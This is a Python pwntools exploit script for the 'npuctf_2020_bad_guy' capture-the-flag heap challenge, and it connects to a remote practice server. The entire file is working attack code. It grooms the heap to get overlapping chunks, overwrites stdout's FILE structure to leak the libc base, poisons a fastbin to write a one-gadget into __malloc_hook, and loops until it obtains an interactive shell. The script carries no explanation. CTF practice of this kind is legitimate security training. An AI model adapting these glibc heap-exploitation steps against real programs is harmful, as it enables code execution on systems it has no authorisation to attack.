import sys
from pwn import *
from ctypes import *
from pwn_debug.pwn_debug import *
binary='npuctf_2020_bad_guy'
elf=ELF(binary)
pdbg=pwn_debug(binary)
pdbg.local("/lib/x86_64-linux-gnu/libc.so.6")
pdbg.debug("2.23")
pdbg.remote('node3.buuoj.cn',26826)
pdbg.context.log_level='debug'
while True :
	try :
		if len(sys.argv)==1 :
			#io=pdbg.run("debug")
			io=pdbg.run("local")
			libc=pdbg.libc
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
			# one_gadgaet=[0x41602,0x41656,0xdef36]
		else :
			io=pdbg.run("remote")
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			# libc=ELF('../../x64libc/libc.so.6')
			# one_gadgaet=[0x4f2c5,0x4f322,0x10a38c]
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]


		def add(a,b,c):
			io.sendlineafter('>> ','1')
			io.sendlineafter('Index :',str(a))
			io.sendlineafter('size: ',str(b))
			io.sendafter('Content:',c)

		def delete(a):
			io.sendlineafter('>> ','3')
			io.sendlineafter('Index :',str(a))

		def edit(a,b,c):
			io.sendlineafter('>> ','2')
			io.sendlineafter('Index :',str(a))
			io.sendlineafter('size: ',str(b))
			io.sendafter('content: ',c)

		def show(a):
			io.sendlineafter('>> ','4')
			io.sendlineafter('Index :',str(a))


		add(0,0x18,'aaaa')
		add(1,0x98,(p64(0)+p64(0x21))*9)
		add(2,0x68,(p64(0)+p64(0x21))*6)
		add(3,0x68,(p64(0)+p64(0x21))*6)
		edit(0,0x20,'\x00'*0x18+p64(0x121))
		delete(1)
		delete(2)
		add(1,0x98,'aaaa')
		edit(1,0x200,(p64(0)+p64(0x21))*9+'\x00'*8+p64(0x71)+'\xdd\x55')
		add(2,0x68,'\x00')
		add(4,0x68,'\x00'*0x33+p64(0xfbad1887)+p64(0)*3+'\x88')



		libc_base=u64(io.recvuntil('\x7f')[-6:]+'\x00\x00')-libc.sym['_IO_2_1_stdin_']
		libc.address=libc_base
		system_addr=libc.sym['system']
		bin_sh_addr=libc.search('/bin/sh\x00').next()


		delete(2)
		edit(1,0x200,(p64(0)+p64(0x21))*9+'\x00'*8+p64(0x71)+p64(libc.sym['__malloc_hook']-0x23))
		add(2,0x68,'\x00')
		add(5,0x68,'\x00'*0x13+p64(libc_base+one_gadgaet[2]))
		edit(0,0x20,'\x00'*0x18+p64(0x191))
		delete(1)

		success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	except Exception as e:
		io.close()
		continue
	else:
		continue